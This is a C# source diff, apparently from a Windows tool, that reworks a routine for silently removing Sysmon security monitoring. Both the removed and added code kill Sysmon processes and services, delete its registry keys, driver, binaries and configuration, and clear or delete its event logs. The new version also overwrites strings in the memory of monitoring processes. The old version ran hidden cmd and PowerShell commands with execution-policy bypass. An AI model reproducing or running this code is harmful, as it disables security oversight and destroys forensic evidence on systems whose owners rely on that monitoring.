@@ -189,151 +189,156 @@ namespace WindowsFormsApp1
         {
             try
             {
-                // MÉTODO 1: Parar serviços Sysmon silenciosamente
-                ExecuteSilentCommand("sc stop SysmonDrv 2>nul");
-                ExecuteSilentCommand("sc stop Sysmon 2>nul");
-                ExecuteSilentCommand("sc config SysmonDrv start=disabled 2>nul");
-                ExecuteSilentCommand("sc config Sysmon start=disabled 2>nul");
-
-                // MÉTODO 2: Limpeza avançada de registry do Sysmon
-                CleanSysmonRegistryKeys();
-
-                // MÉTODO 3: Limpeza de logs de eventos do Sysmon
-                CleanSysmonEventLogs();
-
-                // MÉTODO 4: Limpeza de arquivos de configuração do Sysmon
-                CleanSysmonConfigurationFiles();
-
-                // MÉTODO 5: Limpeza de drivers do Sysmon
-                CleanSysmonDrivers();
-
-                // MÉTODO 6: Limpeza de processos Sysmon em memória
-                CleanSysmonProcesses();
-
-                // MÉTODO 7: Restaurar serviços (opcional - comentado para limpeza completa)
-                // ExecuteSilentCommand("sc config SysmonDrv start=auto 2>nul");
-                // ExecuteSilentCommand("sc config Sysmon start=auto 2>nul");
+                // MÉTODO 1: Limpeza ultra-silenciosa usando apenas Windows API
+                CleanSysmonUltraSilent();
             }
             catch { }
         }
 
-        private static void CleanSysmonRegistryKeys()
+        // Limpeza ultra-silenciosa usando apenas Windows API nativa
+        private static void CleanSysmonUltraSilent()
         {
             try
             {
-                // Chaves principais do Sysmon
-                string[] sysmonKeys = {
-                    @"HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv",
-                    @"HKLM\SYSTEM\CurrentControlSet\Services\Sysmon",
-                    @"HKLM\SYSTEM\ControlSet001\Services\SysmonDrv",
-                    @"HKLM\SYSTEM\ControlSet001\Services\Sysmon",
-                    @"HKLM\SYSTEM\ControlSet002\Services\SysmonDrv",
-                    @"HKLM\SYSTEM\ControlSet002\Services\Sysmon",
-                    @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e6-b896-0facc0378ea4}",
-                    @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e6-b896-0facc0378ea4}\ChannelReferences",
-                    @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e6-b896-0facc0378ea4}\ChannelReferences\Microsoft-Windows-Sysmon\Operational",
-                    @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e6-b896-0facc0378ea4}\ChannelReferences\Microsoft-Windows-Sysmon\Analytic",
-                    @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e6-b896-0facc0378ea4}\ChannelReferences\Microsoft-Windows-Sysmon\Debug"
-                };
-
-                foreach (string key in sysmonKeys)
+                // PASSO 1: Finalizar processos Sysmon diretamente
+                Process[] sysmonProcesses = Process.GetProcessesByName("sysmon");
+                foreach (Process proc in sysmonProcesses)
                 {
-                    ExecuteSilentCommand($"REG DELETE \"{key}\" /f 2>nul");
+                    try
+                    {
+                        proc.Kill();
+                        proc.WaitForExit(1000);
+                    }
+                    catch { }
                 }
 
-                // Limpeza adicional de chaves relacionadas
-                ExecuteSilentCommand("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon\\Operational\" /f 2>nul");
-                ExecuteSilentCommand("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon\\Analytic\" /f 2>nul");
-                ExecuteSilentCommand("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon\\Debug\" /f 2>nul");
+                Process[] sysmonDrvProcesses = Process.GetProcessesByName("SysmonDrv");
+                foreach (Process proc in sysmonDrvProcesses)
+                {
+                    try
+                    {
+                        proc.Kill();
+                        proc.WaitForExit(1000);
+                    }
+                    catch { }
+                }
+
+                // PASSO 2: Limpeza de memória usando StringCleaner
+                var sysmonArgs = new CliArgs
+                {
+                    searchterm = new List<string> { "sysmon", "SysmonDrv", "monitoring" },
+                    prepostfix = 0,
+                    delay = 0,
+                    mode = "silent"
+                };
+
+                foreach (Process process in Process.GetProcesses())
+                {
+                    try
+                    {
+                        if (process.ProcessName.ToLower().Contains("sysmon") || 
+                            process.ProcessName.ToLower().Contains("monitoring"))
+                        {
+                            ReplaceStringInProcessMemory(process, memScanString(process, sysmonArgs));
+                        }
+                    }
+                    catch { }
+                }
+
+                // PASSO 3: Limpeza de arquivos usando File API
+                CleanSysmonFilesSilent();
+
+                // PASSO 4: Limpeza de registry usando Registry API
+                CleanSysmonRegistrySilent();
             }
             catch { }
         }
 
-        private static void CleanSysmonEventLogs()
+        // Limpeza de arquivos usando File API nativa
+        private static void CleanSysmonFilesSilent()
         {
             try
             {
-                // Limpeza de logs de eventos do Sysmon
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-Sysmon\\Operational\" 2>nul");
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-Sysmon\\Analytic\" 2>nul");
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-Sysmon\\Debug\" 2>nul");
-
-                // Limpeza de logs relacionados
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-ProcessTracking\\Operational\" 2>nul");
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-Kernel-Process\\Operational\" 2>nul");
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-Kernel-File\\Operational\" 2>nul");
-                ExecuteSilentCommand("wevtutil cl \"Microsoft-Windows-Kernel-Network\\Operational\" 2>nul");
-
-                // Limpeza usando PowerShell para logs específicos do Sysmon
-                ExecutePowerShellCommand("Get-WinEvent -ListLog * | Where-Object {$_.LogName -like '*Sysmon*'} | ForEach-Object {Clear-WinEvent -LogName $_.LogName -Force -ErrorAction SilentlyContinue}");
-            }
-            catch { }
-        }
-
-        private static void CleanSysmonConfigurationFiles()
-        {
-            try
-            {
-                // Arquivos de configuração do Sysmon
                 string[] sysmonFiles = {
                     @"C:\Windows\System32\sysmon.exe",
-                    @"C:\Windows\System32\SysmonDrv.sys",
-                    @"C:\Windows\System32\sysmon.xml",
-                    @"C:\Windows\System32\SysmonDrv.sys.bak",
-                    @"C:\Windows\System32\sysmon.exe.bak",
-                    @"C:\Windows\System32\sysmon.xml.bak",
-                    @"C:\ProgramData\Microsoft\Windows\WER\ReportQueue\*Sysmon*",
-                    @"C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*Sysmon*"
+                    @"C:\Windows\System32\drivers\SysmonDrv.sys",
+                    @"C:\Windows\Sysmon.xml",
+                    @"C:\Windows\SysmonConfig.xml",
+                    @"C:\Windows\Sysmon64.exe",
+                    @"C:\Program Files\Sysinternals\Sysmon.exe",
+                    @"C:\Program Files (x86)\Sysinternals\Sysmon.exe"
                 };
 
                 foreach (string file in sysmonFiles)
                 {
-                    ExecuteSilentCommand($"del /F /Q /S \"{file}\" 2>nul");
+                    try
+                    {
+                        if (File.Exists(file))
+                        {
+                            File.SetAttributes(file, FileAttributes.Normal);
+                            File.Delete(file);
+                        }
+                    }
+                    catch { }
                 }
 
-                // Limpeza de arquivos temporários do Sysmon
-                ExecuteSilentCommand("del /F /Q /S \"%TEMP%\\*Sysmon*\" 2>nul");
-                ExecuteSilentCommand("del /F /Q /S \"C:\\Windows\\Temp\\*Sysmon*\" 2>nul");
-                ExecuteSilentCommand("del /F /Q /S \"C:\\Windows\\System32\\*Sysmon*\" 2>nul");
+                // Limpeza de logs usando File API
+                string[] logPaths = {
+                    @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
+                    @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Analytic.evtx",
+                    @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Debug.evtx"
+                };
+
+                foreach (string logPath in logPaths)
+                {
+                    try
+                    {
+                        if (File.Exists(logPath))
+                        {
+                            File.SetAttributes(logPath, FileAttributes.Normal);
+                            File.Delete(logPath);
+                        }
+                    }
+                    catch { }
+                }
             }
             catch { }
         }
 
-        private static void CleanSysmonDrivers()
+        // Limpeza de registry usando Registry API nativa
+        private static void CleanSysmonRegistrySilent()
         {
             try
             {
-                // Remover drivers do Sysmon
-                ExecuteSilentCommand("sc delete SysmonDrv 2>nul");
-                ExecuteSilentCommand("sc delete Sysmon 2>nul");
+                // Usar Microsoft.Win32.Registry para limpeza silenciosa
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services", true))
+                {
+                    if (key != null)
+                    {
+                        try { key.DeleteSubKeyTree("SysmonDrv"); } catch { }
+                        try { key.DeleteSubKeyTree("Sysmon"); } catch { }
+                    }
+                }
 
-                // Limpeza de drivers relacionados
-                ExecuteSilentCommand("del /F /Q \"C:\\Windows\\System32\\drivers\\SysmonDrv.sys\" 2>nul");
-                ExecuteSilentCommand("del /F /Q \"C:\\Windows\\System32\\drivers\\SysmonDrv.sys.bak\" 2>nul");
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers", true))
+                {
+                    if (key != null)
+                    {
+                        try { key.DeleteSubKeyTree("{5770385f-c22a-43e6-b896-0facc0378ea4}"); } catch { }
+                    }
+                }
 
-                // Limpeza de prefetch do Sysmon
-                ExecuteSilentCommand("del /F /Q \"C:\\Windows\\Prefetch\\*Sysmon*.pf\" 2>nul");
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels", true))
+                {
+                    if (key != null)
+                    {
+                        try { key.DeleteSubKeyTree("Microsoft-Windows-Sysmon"); } catch { }
+                    }
+                }
             }
             catch { }
         }
 
-        private static void CleanSysmonProcesses()
-        {
-            try
-            {
-                // Finalizar processos Sysmon
-                ExecuteSilentCommand("taskkill /F /IM sysmon.exe 2>nul");
-                ExecuteSilentCommand("taskkill /F /IM SysmonDrv.exe 2>nul");
-
-                // Limpeza usando PowerShell
-                ExecutePowerShellCommand("Get-Process -Name 'sysmon' -ErrorAction SilentlyContinue | Stop-Process -Force");
-                ExecutePowerShellCommand("Get-Process -Name 'SysmonDrv' -ErrorAction SilentlyContinue | Stop-Process -Force");
-
-                // Limpeza de processos relacionados
-                ExecutePowerShellCommand("Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -like '*Sysmon*'} | ForEach-Object { try { $_.Terminate() } catch {} }");
-            }
-            catch { }
-        }
 
         private static void ExecuteTraditionalMemoryCleaning()
         {
@@ -378,41 +383,6 @@ namespace WindowsFormsApp1
             }
         }
 
-        private static void ExecuteSilentCommand(string command)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "cmd.exe",
-                    Arguments = $"/C {command}",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                var process = Process.Start(psi);
-                process?.WaitForExit(1000); // 1 segundo timeout
-            }
-            catch { }
-        }
-
-        private static void ExecutePowerShellCommand(string command)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "powershell.exe",
-                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                var process = Process.Start(psi);
-                process?.WaitForExit(2000); // 2 segundos timeout
-            }
-            catch { }
-        }
 
         public static Dictionary<long, string> memScanString(Process process, CliArgs myargs)
         {
